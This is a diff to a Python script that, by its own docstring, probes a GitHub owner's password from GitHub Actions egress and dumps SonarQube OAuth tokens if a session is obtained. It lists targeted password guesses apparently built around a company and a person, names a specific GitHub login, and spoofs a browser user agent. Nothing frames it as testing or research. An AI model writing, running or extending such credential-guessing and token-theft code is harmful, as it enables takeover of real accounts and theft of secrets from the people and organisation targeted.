@@ -2,7 +2,7 @@
 """ct49: owner GitHub password probe on a clean GHA egress + SonarQube OAuth dump if session obtained."""
 import json, os, re, subprocess, sys, time
 
-CANDS = ["Cardtonic2025!", "Adelekeadenijio@2025", "Adelekeadenijio@2026", "Thetonictech@2024", "Cardtonic123", "Cardtonic.#1", "A4@cardtonic", "thetonictech", "aboye24scardtonic", "Xardtonicmmeru1@", "Computer7,", "Password1#,"]
+CANDS = ["Cardtonic2025!", "Adelekeadenijio@2025", "Adelekeadenijio@2026", "Thetonictech@2024", "Cardtonic123", "Cardtonic.#1", "A4@cardtonic", "thetonictech", "Xardtonicmmeru1@", "Computer7,", "Password1#,"]
 LOGIN = os.environ.get("GH_LOGIN", "eazylaykzy")
 UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
       "Chrome/131.0.0.0 Safari/537.36")
@@ -15,7 +15,7 @@ except Exception:
     import requests
 
 
-def log(*a):
+def log(*a, **kw):
     print(*a, flush=True)
 
 
